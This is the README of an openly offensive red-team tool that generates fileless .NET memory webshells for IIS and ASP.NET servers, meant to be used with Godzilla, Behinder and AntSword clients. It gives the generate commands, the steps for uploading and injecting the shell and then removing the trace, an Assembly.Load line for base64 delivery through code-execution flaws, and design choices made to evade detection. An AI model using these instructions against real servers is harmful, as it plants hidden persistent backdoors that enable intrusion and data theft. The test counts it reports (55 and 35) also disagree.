# NMG - .NET Memory-shell Generator

![.NET](https://img.shields.io/badge/.NET-8.0-512BD4?logo=dotnet)
![Tests](https://img.shields.io/badge/tests-55%20passing-brightgreen)
![License](https://img.shields.io/badge/license-MIT-blue)
![Platform](https://img.shields.io/badge/platform-Windows-lightgrey)

> Parameterized .NET memory shell generator | Red team / security testing | JMG equivalent for .NET

## Architecture

```
+-----------------------------------------------------+
|                    nmg.exe (CLI)                     |
+------------------------+----------------------------+
|  generate (payload)    |  probe (env detection)     |
+------------------------+----------------------------+
|                  Protocol Layer                      |
|  +----------+  +----------+  +----------+           |
|  | Godzilla |  | Behinder |  | AntSword |           |
|  | AES-128  |  | AES-128  |  | Base64   |           |
|  +----------+  +----------+  +----------+           |
+------------------------------------------------------+
|               Template Layer                         |
|  +----------+  +----------+  +--------------+       |
|  |   VPP    |  |  Route   |  | HttpListener |       |
|  | IIS hook |  |MVC Route |  |  Standalone  |       |
|  +----------+  +----------+  +--------------+       |
+------------------------------------------------------+
|             Compilation Engine                       |
|        Roslyn -> DLL (net40/net472)                 |
|    deterministic / XOR obfuscated / randomized      |
+------------------------------------------------------+
|                Output Layer                          |
|    aspx injector / base64 / dll                     |
+------------------------------------------------------+
```

## What is NMG?

NMG generates parameterized .NET memory shell payloads that inject into IIS/ASP.NET applications without leaving files on disk. After injection, you connect with existing webshell managers (Godzilla / Behinder / AntSword) - NMG just makes the server side work.

**Think of it as: `input parameters -> compiled payload -> inject -> connect with client`**

## Features

### Memory Shell Types

| Type | Target | .NET Framework | Trigger Point |
|------|--------|---------------|---------------|
| `vpp` | IIS/ASP.NET | 2.0+ | VirtualPathProvider.GetCacheKey |
| `route` | MVC/WebAPI | 3.5+ | RouteBase.GetRouteData |
| `httplistener` | Standalone/SYSTEM | 2.0+ | HttpListener (independent of IIS) |

### Shell Protocols

| Protocol | Client | Encryption | Verified |
|----------|--------|-----------|----------|
| `godzilla` | Godzilla 4.x | AES-128 (key=MD5(pass+key)[0:16]) | ✅ End-to-end |
| `behinder` | Behinder 4.x | AES-128 (key=MD5(pass)[0:16] raw bytes) | ✅ End-to-end |
| `antsword` | AntSword | Base64 | ✅ End-to-end |

### Output Formats

| Format | Use Case |
|--------|----------|
| `aspx` | Upload to writable directory, access once to inject |
| `b64` | For RCE delivery via deserialization/expression injection |
| `dll` | Raw DLL for custom loaders |

### Subcommands

| Command | Purpose |
|---------|---------|
| `generate` | Generate memory shell payload |
| `probe` | Generate environment detection aspx (reports CLR/trust/MVC/VPP) |
| `version` | Show version |
| `help` | Show usage |

### Web UI

Built-in web interface with Inset Dark theme (Linear-style minimalism):

```bash
cd src/Api && dotnet run --urls "http://127.0.0.1:9901"
# Open http://127.0.0.1:9901
```

## Quick Start

### CLI

```bash
# VPP memory shell, Godzilla protocol, net40 target
nmg generate --type vpp --shell godzilla --pass p@ss123 --seed 42

# Route memory shell for MVC targets
nmg generate --type route --shell godzilla --pass mypass --target net472

# HttpListener for SYSTEM-level access
nmg generate --type httplistener --pass root --path "http://*:8080/cmd/"

# AntSword protocol
nmg generate --type vpp --shell antsword --pass mypass

# Generate environment probe page
nmg probe -o probe.aspx

# Output as Base64 for deserialization delivery
nmg generate --type vpp --shell godzilla --pass p@ss123 --format b64 -o payload.b64
```

### Injection Methods

**Method 1 — ASPX injector:**
1. Upload the generated `.aspx` file to any writable directory on the target
2. Access it once in a browser (triggers `Assembly.Load` + VPP registration)
3. Delete the aspx file
4. Connect with your webshell client to any existing `.aspx`/`.ashx`/`.asmx` on the site

**Method 2 — Base64 (RCE delivery):**
Execute at any code execution point:
```
Assembly.Load(Convert.FromBase64String("<payload>"))
```

### Probe

Upload the generated `probe.aspx` and access it once. It returns JSON with:
```json
{
  "clr": "4.0.30319.42000",
  "trustLevel": "Full",
  "mvc": false,
  "vpp": "Net.Net.Loader.PathHandler74",
  "appPool": "NmgLab"
}
```

Use this to determine which memory shell type and protocol to use.

## Design Principles

1. **Host-safe**: All execution paths wrapped in try-catch, any exception silently passes the request through
2. **Idempotent**: Repeated injection doesn't stack registrations
3. **No file residue**: After injection, no new files in web directory
4. **Deterministic**: Same parameters + same seed = byte-identical output (NFR-5)
5. **No dynamic compilation on target**: Payload is pre-compiled, avoids `ASP.xxx_aspx+ClassName` detection
6. **Dual registration**: VPP uses official API first, falls back to direct field replacement for IIS Integrated mode

## Building

```bash
dotnet build
dotnet test
dotnet publish src -c Release -r win-x64 --self-contained -o publish/
```

## Project Structure

```
nmg/
├── src/
│   ├── Program.cs              # CLI entry point
│   ├── GenerateOptions.cs      # generate pipeline (protocol × type × format)
│   ├── ProbeCommand.cs         # probe subcommand
│   ├── Shells/
│   │   ├── GodzillaCSharp.cs   # Godzilla protocol (AES-128)
│   │   ├── BehinderNet.cs      # Behinder protocol (AES-128 raw bytes)
│   │   └── AntSwordNet.cs      # AntSword protocol (Base64)
│   ├── Templates/
│   │   ├── VppTemplate.cs      # VirtualPathProvider registrar
│   │   ├── RouteTemplate.cs    # RouteBase registrar
│   │   ├── HttpListenerTemplate.cs
│   │   └── ProbeTemplate.cs    # Environment probe page
│   ├── Compiler/
│   │   └── RoslynCompiler.cs   # Multi-target deterministic Roslyn
│   ├── Randomizer/
│   │   └── SeedRandom.cs       # Deterministic randomization
│   ├── Formats/
│   │   ├── AspxInjector.cs     # Self-contained aspx injector page
│   │   └── Base64Output.cs     # Raw Base64 output
│   └── Api/
│       ├── Program.cs          # ASP.NET Core minimal API
│       └── wwwroot/index.html  # Web UI (Inset Dark)
└── tests/                      # 35 unit tests
```

## References

- [BeichenDream/GodzillaMemoryShellProject.NET](https://github.com/BeichenDream/GodzillaMemoryShellProject.NET)
- yzddmr6's ASP.NET memory shell series — filter, route, HttpListener, VirtualPath
- [yzddmr6/ASP.NET-Memshell-Scanner](https://github.com/yzddmr6/ASP.NET-Memshell-Scanner)
- [pen4uin/jmg](https://github.com/pen4uin/jmg) — Java Memory-shell Generator

## License

MIT

